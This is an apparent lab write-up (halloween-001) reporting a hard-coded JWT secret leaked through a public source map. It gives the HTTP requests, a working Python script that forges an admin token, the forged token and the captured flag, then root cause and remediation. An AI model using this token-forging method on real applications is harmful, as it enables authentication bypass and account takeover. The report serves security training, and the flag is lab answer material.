# Bug Report - halloween-001: JWT Weak Secret Leaked in Source Map Allows Admin Token Forgery

**Lab:** halloween-001  
**Difficulty:** Easy  
**Date:** 2026-06-26  
**Severity:** Critical  
**CWE:** CWE-321 (Use of Hard-coded Cryptographic Key)  
**CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) - no auth required, secret recoverable without an account  

---

## Summary

The application signs JWTs with the weak secret "pumpkin". This secret is embedded as plaintext in a React component string that is exposed via an unprotected source map. An unauthenticated attacker can retrieve the secret, forge a JWT containing `role: "admin"`, and call `GET /api/admin/flag` to obtain the flag without needing a valid account.

---

## Steps to Reproduce

**Step 1 - Retrieve the source map and extract the JWT secret**

The CRA build exposes a source map at a predictable path:

```http
GET /static/js/main.e4107f0b.js.map HTTP/1.1
Host: lab-1782472830762-4omwer.labs-app.bugforge.io
```

Extracting `AdminPanel.js` from the source map reveals the secret in a UI string:

```
"The weak signing key 'pumpkin' has revealed its true nature - a lesson in the importance of cryptographic strength."
```

**Step 2 - Register a low-privilege account to observe the JWT structure**

```http
POST /api/register HTTP/1.1
Host: lab-1782472830762-4omwer.labs-app.bugforge.io
Content-Type: application/json

{"username":"hacker1","email":"hacker1@evil.com","password":"Password123!"}
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJoYWNrZXIxIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3ODI0NzI4OTF9.rs1Nd2LxUMJboqz4Dj6p012xmdUQUCGnHks6CzRWO94"}
```

Decoded payload:
```json
{"id": 2, "username": "hacker1", "role": "user", "iat": 1782472891}
```

**Step 3 - Forge an admin JWT signed with "pumpkin"**

```python
import hmac, hashlib, base64, json, time

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({'alg':'HS256','typ':'JWT'}, separators=(',',':')))
payload = b64url(json.dumps({'id':2,'username':'hacker1','role':'admin','iat':int(time.time())}, separators=(',',':')))
sig     = hmac.new(b'pumpkin', f'{header}.{payload}'.encode(), hashlib.sha256).digest()
token   = f'{header}.{payload}.{b64url(sig)}'
print(token)
```

Output:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJoYWNrZXIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgyNDcyODk3fQ.UN1RkY5zyXgOaZsgVxpi1KyYrMpryCBTEzgx4LRQ3Zo
```

**Step 4 - Call the admin flag endpoint with the forged token**

```http
GET /api/admin/flag HTTP/1.1
Host: lab-1782472830762-4omwer.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJoYWNrZXIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzgyNDcyODk3fQ.UN1RkY5zyXgOaZsgVxpi1KyYrMpryCBTEzgx4LRQ3Zo
```

Response:
```json
{
  "flag": "bug{GMyapxnI5c1arfoZ82moBMENFLNssnC1}",
  "message": "Congratulations! You have mastered the dark arts of JWT forgery."
}
```

---

## Impact

- Full authentication bypass - any role can be assumed by any party who reads the source map
- The source map is publicly accessible with no authentication, meaning the secret is exposed to unauthenticated attackers
- All JWT-protected endpoints are compromised - an attacker can impersonate any user ID or role
- The `role` claim is trusted entirely from the token; there is no server-side role lookup against the database

---

## Root Cause

The JWT signing secret is hardcoded as a short dictionary word ("pumpkin") and embedded verbatim in a React component string. The CRA production build includes source maps that are served publicly, making the secret trivially recoverable. Even without the source map, "pumpkin" would be cracked in seconds by any JWT-cracking tool against a standard wordlist.

---

## Remediation

1. Rotate the JWT signing secret immediately to a cryptographically random value of at least 256 bits
2. Remove source maps from the production build (`GENERATE_SOURCEMAP=false` in CRA)
3. Never embed secrets, keys, or credentials in frontend code or strings
4. Look up the user's role from the database on each request rather than trusting the role claim inside the JWT

---

## Flag

`bug{GMyapxnI5c1arfoZ82moBMENFLNssnC1}`
